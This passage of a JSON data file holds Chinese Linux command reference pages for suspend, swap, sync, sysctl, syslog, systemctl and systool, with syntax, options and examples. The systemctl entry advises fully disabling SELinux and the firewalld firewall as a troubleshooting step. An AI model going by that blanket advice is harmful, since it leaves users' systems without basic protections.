        "body": "<h1 id=\"suspend\">suspend</h1>\n<p>挂起shell的执行。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">suspend</span><span class=\"hljs-meta\"> [-f]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>挂起shell的执行，直到收到<code>SIGCONT</code>信号。</p>\n</li>\n<li><p>除非使用<code>-f</code>选项，否则无法对<code>login shell</code>使用。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f    对login shell执行挂起操作。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非未开启作业控制或发生了错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 打开一个终端，首先获取PID。</span>\n<span class=\"hljs-built_in\">echo</span> $$\n<span class=\"hljs-comment\"># 执行挂起命令</span>\n<span class=\"hljs-built_in\">suspend</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 再打开一个终端，发送SIGCONT命令</span>\n<span class=\"hljs-built_in\">kill</span> -s SIGCONT PID\n<span class=\"hljs-comment\"># 此时之前的终端结束挂起状态，可以正常交互。</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令需要<code>set</code>选项<code>monitor</code>处于开启状态时才能执行；查看作业控制状态：输入<code>set -o</code>查看<code>monitor</code>行；执行<code>set -o monitor</code>或<code>set -m</code>开启该选项。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "swapoff",
        "des": "关闭指定的交换空间",
        "body": "<h1 id=\"swapoff\">swapoff</h1>\n<p>关闭指定的交换空间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>swapoff命令</strong> 用于关闭指定的交换空间（包括交换文件和交换分区）。swapoff实际上为swapon的符号连接，可用来关闭系统的交换区。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">swapoff</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a：关闭配置文件“<span class=\"hljs-regexp\">/etc/</span>fstab”中所有的交换空间。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>关闭交换分区</p>\n<pre><code class=\"language-shell\">swapoff <span class=\"hljs-regexp\">/dev/</span>sda2\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "swapon",
        "des": "激活Linux系统中交换空间",
        "body": "<h1 id=\"swapon\">swapon</h1>\n<p>激活Linux系统中交换空间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>swapon命令</strong> 用于激活Linux系统中交换空间，Linux系统的内存管理必须使用交换区来建立虚拟内存。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">swapon</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：将/etc/fstab文件中所有设置为swap的设备，启动为交换区；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-p&lt;优先顺序&gt;：指定交换区的优先顺序；</span>\n<span class=\"hljs-deletion\">-s：显示交换区的使用状况；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">mkswap -c <span class=\"hljs-regexp\">/dev/</span>hdb4 （-c是检查有无坏块）\nswapon -v <span class=\"hljs-regexp\">/dev/</span>hdb4\nswapon -s\nFilename                                type            <span class=\"hljs-keyword\">Size</span>    Used    Priority\n<span class=\"hljs-regexp\">/dev/</span>hda5                               partition       <span class=\"hljs-number\">506008</span> <span class=\"hljs-number\">96</span>      -<span class=\"hljs-number\">1</span>\n<span class=\"hljs-regexp\">/dev/</span>hdb4                               partition       <span class=\"hljs-number\">489972</span> <span class=\"hljs-number\">0</span>       -<span class=\"hljs-number\">2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "sync",
        "des": "用于强制被改变的内容立刻写入磁盘",
        "body": "<h1 id=\"sync\">sync</h1>\n<p>用于强制被改变的内容立刻写入磁盘</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sync命令</strong> 用于强制被改变的内容立刻写入磁盘，更新超块信息。</p>\n<p>在Linux/Unix系统中，在文件或数据处理过程中一般先放到内存缓冲区中，等到适当的时候再写入磁盘，以提高系统的运行效率。sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。用户通常不需执行sync命令，系统会自动执行update或bdflush操作，将缓冲区的数据写 入磁盘。只有在update或bdflush无法执行或用户需要非正常关机时，才需手动执行sync命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sync</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-d, <span class=\"hljs-comment\">--data             只同步文件数据，不同步不必要的元数据</span>\n-f, <span class=\"hljs-comment\">--file-system      同步包含这些文件的文件系统</span>\n<span class=\"hljs-comment\">--help：显示帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"buffer与cache\">buffer与cache</h3>\n<ul>\n<li>  buffer：为了解决写磁盘的效率</li>\n<li>  cache：为了解决读磁盘的效率</li>\n</ul>\n<p>linux系统为了提高读写磁盘的效率，会先将数据放在一块buffer中。在写磁盘时并不是立即将数据写到磁盘中，而是先写入这块buffer中了。此时如果重启系统，就可能造成数据丢失。</p>\n<p>sync命令用来flush文件系统buffer，这样数据才会真正的写到磁盘中，并且buffer才能够释放出来，flush就是用来清空buffer。sync命令会强制将数据写入磁盘中，并释放该数据对应的buffer，所以常常会在写磁盘后输入sync命令来将数据真正的写入磁盘。</p>\n<p>如果不去手动的输入sync命令来真正的去写磁盘，linux系统也会周期性的去sync数据。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "sysctl",
        "des": "时动态地修改内核的运行参数",
        "body": "<h1 id=\"sysctl\">sysctl</h1>\n<p>时动态地修改内核的运行参数</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>sysctl命令</strong> 被用于在内核运行时动态地修改内核的运行参数，可用的内核参数在目录<code>/proc/sys</code>中。它包含一些TCP/ip堆栈和虚拟内存系统的高级选项， 这可以让有经验的管理员提高引人注目的系统性能。用sysctl可以读取设置超过五百个系统变量。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">sysctl</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n：打印值时不打印关键字；</span>\n<span class=\"hljs-deletion\">-e：忽略未知关键字错误；</span>\n<span class=\"hljs-deletion\">-N：仅打印名称；</span>\n<span class=\"hljs-deletion\">-w：当改变sysctl设置时使用此项；</span>\n<span class=\"hljs-deletion\">-p：从配置文件“/etc/sysctl.conf”加载内核参数设置；</span>\n<span class=\"hljs-deletion\">-a：打印当前所有可用的内核参数变量和值；</span>\n<span class=\"hljs-deletion\">-A：以表格方式打印当前所有可用的内核参数变量和值。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>变量=值：设置内核参数对应的变量值。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查看所有可读变量：</p>\n<p>sysctl -a</p>\n<p>读一个指定的变量，例如<code>kern.maxproc</code>：</p>\n<p>sysctl kern.maxproc kern.maxproc: 1044</p>\n<p>要设置一个指定的变量，直接用<code>variable=value</code>这样的语法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sysctl</span> kern.maxfiles=<span class=\"hljs-number\">5000</span>\n<span class=\"hljs-attribute\">kern</span>.maxfiles: <span class=\"hljs-number\">2088</span> -&gt; <span class=\"hljs-number\">5000</span>\n</code></pre>\n<p>您可以使用sysctl修改系统变量，也可以通过编辑sysctl.conf文件来修改系统变量。sysctl.conf看起来很像rc.conf。它用<code>variable=value</code>的形式来设定值。指定的值在系统进入多用户模式之后被设定。并不是所有的变量都可以在这个模式下设定。</p>\n<p>sysctl变量的设置通常是字符串、数字或者布尔型。（布尔型用 1 来表示'yes'，用 0 来表示'no'）。</p>\n<pre><code class=\"language-shell\">sysctl -w kernel.<span class=\"hljs-attribute\">sysrq</span>=0\nsysctl -w kernel.<span class=\"hljs-attribute\">core_uses_pid</span>=1\nsysctl -w net.ipv4.conf.default.<span class=\"hljs-attribute\">accept_redirects</span>=0\nsysctl -w net.ipv4.conf.default.<span class=\"hljs-attribute\">accept_source_route</span>=0\nsysctl -w net.ipv4.conf.default.<span class=\"hljs-attribute\">rp_filter</span>=1\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_syncookies</span>=1\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_max_syn_backlog</span>=2048\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_fin_timeout</span>=30\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_synack_retries</span>=2\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_keepalive_time</span>=3600\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_window_scaling</span>=1\nsysctl -w net.ipv4.<span class=\"hljs-attribute\">tcp_sack</span>=1\n</code></pre>\n<h3 id=\"配置sysctl\">配置sysctl</h3>\n<p>编辑此文件：<code>/etc/sysctl.conf</code></p>\n<p>如果该文件为空，则输入以下内容，否则请根据情况自己做调整：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># Controls source route verification</span>\n<span class=\"hljs-comment\"># Default should work for all interfaces</span>\n<span class=\"hljs-attr\">net.ipv4.conf.default.rp_filter</span> = <span class=\"hljs-number\">1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.all.rp_filter = 1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.lo.rp_filter = 1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.eth0.rp_filter = 1</span>\n\n<span class=\"hljs-comment\"># Disables IP source routing</span>\n<span class=\"hljs-comment\"># Default should work for all interfaces</span>\n<span class=\"hljs-attr\">net.ipv4.conf.default.accept_source_route</span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.all.accept_source_route = 0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.lo.accept_source_route = 0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.eth0.accept_source_route = 0</span>\n\n<span class=\"hljs-comment\"># Controls the System Request debugging functionality of the kernel</span>\n<span class=\"hljs-attr\">kernel.sysrq</span> = <span class=\"hljs-number\">0</span>\n\n<span class=\"hljs-comment\"># Controls whether core dumps will append the PID to the core filename.</span>\n<span class=\"hljs-comment\"># Useful for debugging multi-threaded applications.</span>\n<span class=\"hljs-attr\">kernel.core_uses_pid</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Increase maximum amount of memory allocated to shm</span>\n<span class=\"hljs-comment\"># Only uncomment if needed!</span>\n<span class=\"hljs-comment\"># kernel.shmmax = 67108864</span>\n\n<span class=\"hljs-comment\"># Disable ICMP Redirect Acceptance</span>\n<span class=\"hljs-comment\"># Default should work for all interfaces</span>\n<span class=\"hljs-attr\">net.ipv4.conf.default.accept_redirects</span> = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.all.accept_redirects = 0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.lo.accept_redirects = 0</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.eth0.accept_redirects = 0</span>\n\n<span class=\"hljs-comment\"># enable Log Spoofed Packets, Source Routed Packets, Redirect Packets</span>\n<span class=\"hljs-comment\"># Default should work for all interfaces</span>\n<span class=\"hljs-attr\">net.ipv4.conf.default.log_martians</span> = <span class=\"hljs-number\">1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.all.log_martians = 1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.lo.log_martians = 1</span>\n<span class=\"hljs-comment\"># net.ipv4.conf.eth0.log_martians = 1</span>\n\n<span class=\"hljs-comment\"># Decrease the time default value for tcp_fin_timeout connection</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_fin_timeout</span> = <span class=\"hljs-number\">25</span>\n\n<span class=\"hljs-comment\"># Decrease the time default value for tcp_keepalive_time connection</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_keepalive_time</span> = <span class=\"hljs-number\">1200</span>\n\n<span class=\"hljs-comment\"># Turn on the tcp_window_scaling</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_window_scaling</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Turn on the tcp_sack</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_sack</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># tcp_fack should be on because of sack</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_fack</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Turn on the tcp_timestamps</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_timestamps</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Enable TCP SYN Cookie Protection</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_syncookies</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Enable ignoring broadcasts request</span>\n<span class=\"hljs-attr\">net.ipv4.icmp_echo_ignore_broadcasts</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># Enable bad error message Protection</span>\n<span class=\"hljs-attr\">net.ipv4.icmp_ignore_bogus_error_responses</span> = <span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># make more local ports available</span>\n<span class=\"hljs-comment\"># net.ipv4.ip_local_port_range = 1024 65000</span>\n\n<span class=\"hljs-comment\"># set TCP Re-Ordering value in kernel to ‘5′</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_reordering</span> = <span class=\"hljs-number\">5</span>\n\n<span class=\"hljs-comment\"># Lower syn retry rates</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_synack_retries</span> = <span class=\"hljs-number\">2</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_syn_retries</span> = <span class=\"hljs-number\">3</span>\n\n<span class=\"hljs-comment\"># Set Max SYN Backlog to ‘2048′</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_max_syn_backlog</span> = <span class=\"hljs-number\">2048</span>\n\n<span class=\"hljs-comment\"># Various Settings</span>\n<span class=\"hljs-attr\">net.core.netdev_max_backlog</span> = <span class=\"hljs-number\">1024</span>\n\n<span class=\"hljs-comment\"># Increase the maximum number of skb-heads to be cached</span>\n<span class=\"hljs-attr\">net.core.hot_list_length</span> = <span class=\"hljs-number\">256</span>\n\n<span class=\"hljs-comment\"># Increase the tcp-time-wait buckets pool size</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_max_tw_buckets</span> = <span class=\"hljs-number\">360000</span>\n\n<span class=\"hljs-comment\"># This will increase the amount of memory available for socket input/output queues</span>\n<span class=\"hljs-attr\">net.core.rmem_default</span> = <span class=\"hljs-number\">65535</span>\n<span class=\"hljs-attr\">net.core.rmem_max</span> = <span class=\"hljs-number\">8388608</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_rmem</span> = <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">87380</span> <span class=\"hljs-number\">8388608</span>\n<span class=\"hljs-attr\">net.core.wmem_default</span> = <span class=\"hljs-number\">65535</span>\n<span class=\"hljs-attr\">net.core.wmem_max</span> = <span class=\"hljs-number\">8388608</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_wmem</span> = <span class=\"hljs-number\">4096</span> <span class=\"hljs-number\">65535</span> <span class=\"hljs-number\">8388608</span>\n<span class=\"hljs-attr\">net.ipv4.tcp_mem</span> = <span class=\"hljs-number\">8388608</span> <span class=\"hljs-number\">8388608</span> <span class=\"hljs-number\">8388608</span>\n<span class=\"hljs-attr\">net.core.optmem_max</span> = <span class=\"hljs-number\">40960</span>\n</code></pre>\n<p>如果希望屏蔽别人 ping 你的主机，则加入以下代码：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># Disable ping requests</span>\n<span class=\"hljs-attr\">net.ipv4.icmp_echo_ignore_all</span> = <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>编辑完成后，请执行以下命令使变动立即生效：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/sbin/</span>sysctl -p\n<span class=\"hljs-regexp\">/sbin/</span>sysctl -w net.ipv4.route.flush=<span class=\"hljs-number\">1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "syslog",
        "des": "系统默认的日志守护进程",
        "body": "<h1 id=\"syslog\">syslog</h1>\n<p>系统默认的日志守护进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>syslog</strong> 是Linux系统默认的日志守护进程。默认的syslog配置文件是/etc/syslog.conf文件。程序，守护进程和内核提供了访问系统的日志信息。因此，任何希望生成日志信息的程序都可以向 syslog 接口呼叫生成该信息。</p>\n<p>几乎所有的网络设备都可以通过syslog协议，将日志信息以用户数据报协议(UDP)方式传送到远端服务器，远端接收日志服务器必须通过syslogd监听UDP 端口514，并根据 syslog.conf配置文件中的配置处理本机，接收访问系统的日志信息，把指定的事件写入特定文件中，供后台数据库管理和响应之用。意味着可以让任何事件都登录到一台或多台服务器上，以备后台数据库用off-line(离线) 方法分析远端设备的事件。</p>\n<p>通常，syslog 接受来自系统的各种功能的信息，每个信息都包括重要级。/etc/syslog.conf 文件通知 syslogd 如何根据设备和信息重要级别来报告信息。</p>\n<h3 id=\"使用方法\">使用方法</h3>\n<p>在/var/log中创建并写入日志信息是由syslog协议处理的，是由守护进程sylogd负责执行。每个标准的进程都可以用syslog记录日志。可以使用logger命令通过syslogd记录日志。</p>\n<p>要向syslog文件/var/log/messages中记录日志信息：</p>\n<pre><code class=\"language-shell\">logger this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span class=\"hljs-built_in\">log</span> <span class=\"hljs-built_in\">line</span>\n\n输出：\ntail -n <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">messages</span>\nJan  <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">03</span> localhost root: this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span class=\"hljs-built_in\">log</span> <span class=\"hljs-built_in\">line</span>\n</code></pre>\n<p>如果要记录特定的标记（tag）可以使用：</p>\n<pre><code class=\"language-shell\">logger -t TAG this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span class=\"hljs-built_in\">log</span> <span class=\"hljs-built_in\">line</span>\n\n输出：\ntail -n <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">messages</span>\nJan  <span class=\"hljs-number\">5</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span>:<span class=\"hljs-number\">14</span> localhost TAG: this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span class=\"hljs-built_in\">log</span> <span class=\"hljs-built_in\">line</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "systemctl",
        "des": "系统服务管理器指令",
        "body": "<h1 id=\"systemctl\">systemctl</h1>\n<p>系统服务管理器指令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>systemctl命令</strong> 是系统服务管理器指令，它实际上将 service 和 chkconfig 这两个命令组合到一起。</p>\n<table>\n<thead>\n<tr>\n<th>任务</th>\n<th>旧指令</th>\n<th>新指令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>使某服务自动启动</td>\n<td>chkconfig --level 3 httpd on</td>\n<td>systemctl enable httpd.service</td>\n</tr>\n<tr>\n<td>使某服务不自动启动</td>\n<td>chkconfig --level 3 httpd off</td>\n<td>systemctl disable httpd.service</td>\n</tr>\n<tr>\n<td>检查服务状态</td>\n<td>service httpd status</td>\n<td>systemctl status httpd.service （服务详细信息） systemctl is-active httpd.service （仅显示是否 Active)</td>\n</tr>\n<tr>\n<td>显示所有已启动的服务</td>\n<td>chkconfig --list</td>\n<td>systemctl list-units --type=service</td>\n</tr>\n<tr>\n<td>启动服务</td>\n<td>service httpd start</td>\n<td>systemctl start httpd.service</td>\n</tr>\n<tr>\n<td>停止服务</td>\n<td>service httpd stop</td>\n<td>systemctl stop httpd.service</td>\n</tr>\n<tr>\n<td>重启服务</td>\n<td>service httpd restart</td>\n<td>systemctl restart httpd.service</td>\n</tr>\n<tr>\n<td>重载服务</td>\n<td>service httpd reload</td>\n<td>systemctl reload httpd.service</td>\n</tr>\n</tbody></table>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">systemctl</span> <span class=\"hljs-string\">start</span> <span class=\"hljs-string\">nfs-server</span>.<span class=\"hljs-string\">service</span> . <span class=\"hljs-comment\"># 启动nfs服务</span>\n<span class=\"hljs-string\">systemctl</span>&nbsp;<span class=\"hljs-string\">enable</span>&nbsp;<span class=\"hljs-string\">nfs-server</span>.<span class=\"hljs-string\">service</span> <span class=\"hljs-comment\"># 设置开机自启动</span>\n<span class=\"hljs-string\">systemctl</span>&nbsp;<span class=\"hljs-string\">disable</span>&nbsp;<span class=\"hljs-string\">nfs-server</span>.<span class=\"hljs-string\">service</span> <span class=\"hljs-comment\"># 停止开机自启动</span>\n<span class=\"hljs-string\">systemctl</span>&nbsp;<span class=\"hljs-string\">status</span>&nbsp;<span class=\"hljs-string\">nfs-server</span>.<span class=\"hljs-string\">service</span> <span class=\"hljs-comment\"># 查看服务当前状态</span>\n<span class=\"hljs-string\">systemctl</span>&nbsp;<span class=\"hljs-string\">restart</span>&nbsp;<span class=\"hljs-string\">nfs-server</span>.<span class=\"hljs-string\">service</span> <span class=\"hljs-comment\"># 重新启动某服务</span>\n<span class=\"hljs-string\">systemctl</span>&nbsp;<span class=\"hljs-built_in\">list-units</span>&nbsp;<span class=\"hljs-built_in\">--type=service</span> <span class=\"hljs-comment\"># 查看所有已启动的服务</span>\n</code></pre>\n<p>开启防火墙22端口</p>\n<pre><code class=\"language-shell\">iptables&nbsp;-<span class=\"hljs-selector-tag\">I</span>&nbsp;<span class=\"hljs-selector-tag\">INPUT</span>&nbsp;-<span class=\"hljs-selector-tag\">p</span>&nbsp;tcp&nbsp;--dport&nbsp;<span class=\"hljs-number\">22</span>&nbsp;-j&nbsp;accept\n</code></pre>\n<p>如果仍然有问题，就可能是SELinux导致的</p>\n<p>关闭SElinux：</p>\n<p>修改<code>/etc/selinux/config</code>文件中的<code>SELINUX=\"\"</code>为disabled，然后重启。</p>\n<p>彻底关闭防火墙：</p>\n<pre><code class=\"language-shell\">sudo<span class=\"hljs-keyword\">&nbsp;system</span>ctl&nbsp;status firewalld.service\nsudo<span class=\"hljs-keyword\">&nbsp;system</span>ctl&nbsp;stop&nbsp;firewalld.service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\nsudo<span class=\"hljs-keyword\">&nbsp;system</span>ctl&nbsp;disable&nbsp;firewalld.service\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "systool",
        "des": "显示基于总线、类和拓扑显示系统中设备的信息",
        "body": "<h1 id=\"systool\">systool</h1>\n<p>显示基于总线、类和拓扑显示系统中设备的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>systool命令</strong> 指令显示基于总线、类和拓扑显示系统中设备的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">systool</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示被请求资源的属性；</span>\n<span class=\"hljs-deletion\">-b&lt;总线&gt;：显示指定总线的信息；</span>\n<span class=\"hljs-deletion\">-c&lt;class&gt;：显示指定类的信息；</span>\n<span class=\"hljs-deletion\">-d：仅显示设备；</span>\n<span class=\"hljs-deletion\">-h：显示指令的用法；</span>\n<span class=\"hljs-deletion\">-m&lt;模块名称&gt;：显示指定模块的信息；</span>\n<span class=\"hljs-deletion\">-p：显示资源的“sysfs”绝对路径；</span>\n<span class=\"hljs-deletion\">-v：显示所有属性；</span>\n<span class=\"hljs-deletion\">-A&lt;属性&gt;：显示请求资源的属性值；</span>\n<span class=\"hljs-deletion\">-D：仅显示驱动程序信息；</span>\n<span class=\"hljs-deletion\">-P：显示设备的父类。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备：指定要查看信息的设备名称。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># systool</span>\nSupported sysfs <span class=\"hljs-keyword\">buses:\n</span>        acpi\n        i2c\n        ide\n        pci_express\n        pci\n        pcmcia\n        platform\n        pnp\n        <span class=\"hljs-keyword\">scsi\n</span>        serio\n        usb\nSupported sysfs classes:\n        <span class=\"hljs-keyword\">backlight\n</span>        cpuid\n        dma_v3\n        firmware\n        graphics\n        hidraw\n        hwmon\n        i2c-adapter\n        input\n        leds\n        mem\n        misc\n        msr\n        net\n        pci_bus\n        pcmcia_socket\n        printer\n        raw\n        sas_device\n        sas_end_device\n        sas_expander\n        sas_host\n        sas_phy\n        sas_port\n        <span class=\"hljs-keyword\">scsi_device\n</span>        <span class=\"hljs-keyword\">scsi_disk\n</span>        <span class=\"hljs-keyword\">scsi_generic\n</span>        <span class=\"hljs-keyword\">scsi_host\n</span>        sound\n        tty\n        usb_device\n        usb_endpoint\n        usb_host\n        vc\n        vtconsole\nSupported sysfs devices:\n        acpi\n<span class=\"hljs-symbol\">        pci0000:</span><span class=\"hljs-number\">00</span>\n        platform\n        pnp0\n        sequencer2\n        sequencer\n        seq\n        system\n        timer\nSupported sysfs modules:\n        <span class=\"hljs-number\">8250</span>\n        acpi_memhotplug\n        ac\n        asus_acpi\n        ata_piix\n        auth_rpcgss\n        <span class=\"hljs-keyword\">backlight\n</span>        <span class=\"hljs-keyword\">battery\n</span>        <span class=\"hljs-keyword\">button\n</span>        cifs\n        cpufreq\n        crypto_api\n        dell_wmi\n        dm_log\n        dm_mem_cache\n        dm_message\n        dm_mirror\n        dm_mod\n        dm_multipath\n        dm_raid45\n        dm_region_hash\n        dock\n        e1000e\n        edac_mc\n        ehci_hcd\n        exportfs\n        <span class=\"hljs-keyword\">ext3\n</span>        hwmon\n        i2c_core\n        i2c_ec\n        i2c_i801\n        i7core_edac\n        i8042\n        ip_conntrack_netbios_ns\n        ip_conntrack\n        ip_tables\n        iptable_filter\n        ipv6\n        it821x\n        <span class=\"hljs-keyword\">jbd\n</span>        <span class=\"hljs-keyword\">joydev\n</span>        keyboard\n        libata\n        lockd\n        lp\n        md_mod\n        mousedev\n        mpt2sas\n        nfnetlink\n        nfs_acl\n        nfsd\n        nls_utf8\n        ohci_hcd\n        parport_pc\n        parport\n        pci_hotplug\n        pcmcia\n        pcmcia_core\n        pcspkr\n        piix\n        power_meter\n        printk\n        processor\n        psmouse\n        rsrc_nonstatic\n        <span class=\"hljs-keyword\">sbs\n</span>        <span class=\"hljs-keyword\">scsi_dh\n</span>        <span class=\"hljs-keyword\">scsi_mod\n</span>        <span class=\"hljs-keyword\">scsi_transport_sas\n</span>        sd_mod\n        serio_raw\n        sg\n        <span class=\"hljs-keyword\">shpchp\n</span>        snd_hda_intel\n        snd_hwdep\n        snd_mixer_oss\n        snd_page_alloc\n        snd_pcm_oss\n        snd_pcm\n        snd_seq_device\n        snd_seq_dummy\n        snd_seq_midi_event\n        snd_seq_oss\n        snd_seq\n        snd_timer\n        snd\n        soundcore\n        sunrpc\n        tcp_bic\n        tpm_bios\n        tpm_tis\n        tpm\n        uhci_hcd\n        usbcore\n        usbhid\n        video\n        wmi\n        x_tables\n        xfrm_nalgo\n        xt_limit\n        xt_state\n        xt_tcpudp\n        yenta_socket\n</code></pre>\n<!-- 